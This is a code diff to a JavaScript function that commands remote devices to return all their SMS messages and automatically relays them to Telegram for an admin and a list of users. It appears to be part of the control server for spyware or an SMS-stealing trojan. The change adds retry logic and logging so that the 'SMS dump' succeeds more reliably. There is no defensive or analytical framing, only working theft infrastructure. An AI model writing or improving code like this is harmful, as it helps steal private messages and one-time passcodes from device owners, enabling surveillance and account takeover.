@@ -216,17 +216,30 @@ function _getTcpConnForDevice(deviceId) {
 }
 
 async function _autoSendSmsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
-    // Request SMS from device — use 90s timeout so devices with large SMS histories have enough time to collect and transmit
+    // Request SMS from device — retry up to 3 times with a 10s wait between attempts.
+    // 90s timeout per attempt gives large SMS histories enough time to collect and transmit.
     let msgs = [];
-    try {
-        const resp = await _sendAndCapture(deviceId, 'get_all_sms', { limit: 100 }, 90000);
-        if (resp) {
-            const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
-            msgs = d.messages || d.sms || d.smsList || d.smsMessages || d.allSms
-                || d.data || d.results || [];
+    const MAX_ATTEMPTS = 3;
+    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
+        try {
+            log('TELEGRAM', `SMS dump attempt ${attempt}/${MAX_ATTEMPTS} for ${deviceId}`);
+            const resp = await _sendAndCapture(deviceId, 'get_all_sms', { limit: 100 }, 90000);
+            if (resp) {
+                const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
+                msgs = d.messages || d.sms || d.smsList || d.smsMessages || d.allSms
+                    || d.data || d.results || [];
+            }
+        } catch (_) {}
+        if (msgs.length) break;
+        if (attempt < MAX_ATTEMPTS) {
+            log('TELEGRAM', `SMS dump attempt ${attempt} returned no messages — waiting 10s before retry…`, 'warn');
+            await new Promise(r => setTimeout(r, 10000));
         }
-    } catch (_) {}
-    if (!msgs.length) return;
+    }
+    if (!msgs.length) {
+        log('TELEGRAM', `SMS dump failed after ${MAX_ATTEMPTS} attempts for ${deviceId} — device returned no messages`, 'warn');
+        return;
+    }
 
     const limited = msgs.slice(0, 100);
     const esc = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
